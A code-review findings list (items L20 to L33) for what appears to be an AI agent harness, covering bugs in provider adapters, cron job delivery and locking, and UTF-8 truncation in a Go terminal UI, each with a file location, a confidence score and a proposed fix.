**L20. Session row records bootstrap provider name even for per-request explicit-model transports** — `src/openai/routes/chatCompletions.ts:183` · consistency · conf 0.75  
upsertSession stamps provider as runtime.resolvedProvider.transport.name even when the request resolved an explicit model on a different family (e.g., gpt-4o on an anthropic-bootstrapped runtime) — the row says provider 'anthropic', model 'gpt-4o'. The trajectory record similarly stamps runtime.model/provider, not the request's. Operator observability and cost attribution mislabeled for explicit-model requests.  
*Fix:* Stamp `resolved.transport.name` on the session row and thread the request's resolved provider/model into trajectoryMetadata.

**L21. Empty assistant content in replayed history maps to empty content array — upstream 400** — `src/openai/mapping/requestToMessages.ts:63` · edge · conf 0.5  
An assistant history message with content '' (or null) and no tool_calls — including the harness's own non-streaming response shape when a turn produced no text (blocksToOpenAI returns content '') — maps to an assistant Message with zero content blocks. Anthropic rejects empty-content messages, so replaying such a turn 400s the whole conversation.  
*Fix:* When mapAssistant produces zero blocks, drop the message or substitute a placeholder text block (e.g., single space) before sending upstream.

**L22. parseSse drops a final unterminated data line (no post-loop flush)** — `src/providers/openai.ts:343` · edge · conf 0.55  
When an OpenAI-compatible backend (sov MLX engine, proxies) closes the stream without a trailing newline after the last 'data:' line, the residual buffer is discarded — the loop only processes complete lines and there is no tail flush after done (ollama's parseJsonLines flushes its tail). The lost final chunk typically carries finish_reason and the include_usage usage payload, so token/cost accounting silently reads zero and stop reason defaults to end_turn.  
*Fix:* After the read loop, decoder.decode() flush plus process remaining buffer line(s) exactly as ollama's parser does.

**L23. Effort silently lowers a caller max_tokens above 32000 despite raise-only doc** — `src/providers/effort.ts:103` · consistency · conf 0.6  
MAX_TOKENS_CEILING is documented as 'Hard upper bound on max_tokens we'll ever raise a request to', but anthropicThinkingFor applies min(32000, ...) unconditionally: a user running --max-tokens 64000 (Sonnet supports 64k output) who enables any effort level gets max_tokens silently cut to 32000, truncating long outputs only when thinking is on.  
*Fix:* Use Math.max(maxTokens, Math.min(MAX_TOKENS_CEILING, budget + RESPONSE_HEADROOM)) so the ceiling bounds only the raise, never the caller's value.

**L24. Ollama synthetic tool_use ids restart at 0 every stream — duplicate ids across turns** — `src/providers/ollama.ts:183` · edge · conf 0.5  
toolCounter is local to translateOllamaStream, so each model call in a session mints ollama_tool_0, ollama_tool_1... again. Session history then contains multiple tool_use blocks and tool_results sharing tool_use_id across turns; id-keyed consumers (microcompact's buildToolNameMap, repair-missing-tool-results, trace/learning pairing, UI streaming keyed by id) can mispair earlier-turn entries with later ones.  
*Fix:* Make ids unique per call, e.g. include a random/timestamp prefix: `ollama_${Date.now().toString(36)}_${toolCounter++}`.

**L25. Cron outbox grows unbounded; deleteJob orphans outbox dirs** — `src/channels/delivery.ts:47` · perf · conf 0.7  
Every non-silent cron fire writes a new `<ts>.txt` under cron/outbox/<jobId>/ with no pruning, rotation, or cap anywhere; empty agent output still writes a 0-byte file. An `every 1m` job creates ~525k files/year, degrading directory operations. deleteJob removes only the jobs.json entry, leaving the job's outbox tree forever.  
*Fix:* Cap per-job outbox (keep last N files, prune on write) and remove the outbox dir in deleteJob.

**L26. Delivery failures silent: error dropped, target unvalidated, output unrecorded** — `src/cron/execute.ts:67` · bug · conf 0.7  
`cron add --deliver` stores any string unvalidated, but send() only knows 'local'. A typo'd target makes every run return {ok:false, error:'unknown delivery target'} from send — yet the executor keeps only `delivery.ok`, discarding delivery.error, and recordJobRun persists no output. The operator sees deliveryOk:false with no reason and the agent's output is lost (only in trace).  
*Fix:* Validate deliver target in runCronAdd (known set), and thread delivery.error into lastResult (e.g. deliveryError field).

**L27. CronRunner.stop()/dispose() don't await in-flight tick; lock released early** — `src/cron/runner.ts:44` · bug · conf 0.5  
stop() synchronously releases the cross-process tick lock while an async tick may still be mid-job (tick's promise is fire-and-forget). Another process can then start the same not-yet-recorded job → concurrent duplicate execution if the first process lives on. runtime.dispose() also closes sessionDb without awaiting the tick, contradicting its comment that in-flight cron jobs write "while it's still open" — the surviving turn hits a closed DB and records a spurious failure.  
*Fix:* Track the in-flight tick promise; make stop() async and await it (mirror SessionSupervisor.stop()), then release the lock; await in dispose before sessionDb.close().

**L28. loadJobs validates JSON parse but not shape — malformed jobs.json wedges tick** — `src/cron/jobs.ts:73` · edge · conf 0.6  
Hand-editing jobs.json is the only way to set scriptTimeoutMs (no CLI flag), so operator edits are expected. If `jobs` is valid JSON but not an array (or an entry lacks fields), `parsed.jobs ?? []` passes it through; runDueJobs' `.filter` then throws every 60s as an unhandled rejection from `void this.tick()` (no catch in tick), and earlier-due jobs after a throwing entry are skipped that tick. addJob's `.push` also crashes.  
*Fix:* Guard `Array.isArray(parsed.jobs)` (treat as corrupt otherwise, reusing the stderr-once path) and add a catch in tick().

**L29. printUser truncation slices UTF-8 mid-rune and miscounts omitted chars** — `packages/tui/internal/app/app.go:220` · edge · conf 0.75  
Echo truncation uses byte indexing: `body[:userMessageDisplayCap]` on a >1500-byte paste of multi-byte text (CJK, emoji) can split a rune, producing invalid UTF-8 (mojibake) in the echoed line; `len(body)` also reports bytes as "chars" so the +N notice is wrong for non-ASCII. Display-only — the actual turn ships full content.  
*Fix:* Truncate on rune boundary (convert to []rune or walk with utf8.DecodeRuneInString) and report omitted runes.

**L30. Failed POST /turns leaves the thinking spinner running forever** — `packages/tui/internal/app/app.go:1468` · bug · conf 0.8  
Submit sets thinkingPending=true and starts the spinner before the POST. If the POST fails (server down/timeout), turnSubmitErrMsg only prints 'submit error' — thinkingPending and the spinner tick chain are never cleared, so the UI animates 'thinking' indefinitely with no turn in flight. A later ESC then fires a pointless cancel and leaves userCancelledTurn=true, which will swallow the next genuine turn_error.  
*Fix:* Call m.clearThinkingIfPending() in the turnSubmitErrMsg handler before printing.

**L31. inlineLines=0 renders full output instead of documented header-only detailed card** — `packages/tui/internal/app/app.go:545` · consistency · conf 0.8  
Config schema (src/config/schema.ts:109) and WithToolOutput's comment document ui.toolOutput.inlineLines=0 as 'header-only' detailed mode. WithToolOutput accepts 0, but ToolCard.View truncates only when `InlineLines > 0` — 0 disables truncation entirely, so a user requesting the most minimal rendering gets fully untruncated output, the exact opposite.  
*Fix:* In ToolCard.View treat InlineLines==0 as 'omit body, header+summary only'; keep negative as the unlimited sentinel.

**L32. Permission modal preview byte-slices UTF-8 mid-rune** — `packages/tui/internal/components/permission.go:118` · edge · conf 0.9  
`len(preview) > PreviewMax` and `preview[:PreviewMax-3]` operate on bytes; tool input containing multi-byte characters (CJK paths, accented text, emoji) past the 60-byte boundary is cut mid-rune, rendering an invalid-UTF-8 tail (mojibake/U+FFFD) inside the security-relevant permission box, and non-ASCII input truncates far earlier than 60 visible chars.  
*Fix:* Truncate on runes ([]rune(preview)[:n]) or reuse compactline's truncateTail helper.

**L33. truncatePreview byte-slices UTF-8 in tool-card and MCP/unknown-tool previews** — `packages/tui/internal/components/toolcard.go:119` · edge · conf 0.85  
truncatePreview compares and slices by bytes (`len(flat) <= max`, `flat[:max-3]+"..."`); it feeds the detailed-mode ToolCard header and the compact line's unknown-tool and MCP input previews (raw JSON often containing user text). Non-ASCII content at the cut point yields an invalid UTF-8 tail rendered as replacement characters; CJK previews truncate at roughly a third of the intended width.  
*Fix:* Convert to rune-based slicing or delegate to truncateTail with "..." suffix.
